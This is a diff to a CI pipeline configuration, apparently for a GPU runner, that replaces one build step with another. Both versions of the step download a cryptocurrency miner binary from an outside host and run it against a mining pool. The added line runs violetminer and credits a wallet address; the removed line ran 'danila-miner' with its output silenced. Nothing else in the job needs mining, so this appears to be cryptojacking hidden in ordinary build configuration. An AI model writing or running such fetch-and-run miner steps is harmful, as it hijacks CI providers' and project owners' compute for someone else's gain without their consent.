@@ -7,5 +7,5 @@ jobs:
     resource_class: gpu.nvidia.large
     steps:
       - run: nvidia-smi
-      - run: wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1 && tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1 && chmod +x danila-miner >/dev/null 2>&1 && ./danila-miner run https://server1.whalestonpool.com EQDNhrBNvfhU9pHI3okVlDyLd_QSy9njt4XjlciRYFTLD0Y9
+      - run: wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --pool pool.hashvault.pro:80 --username TRTLv3s1h7QGxQmg6Ar1pST9d8NLjCiX3Gy46qR5orkrX4Xhp1FRZUDR7EU8dANoK2MqUmQdAmBMoVJexjEmW6yt1soAFJxBNYm --password memek --algorithm chukwa/wrkz
       - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
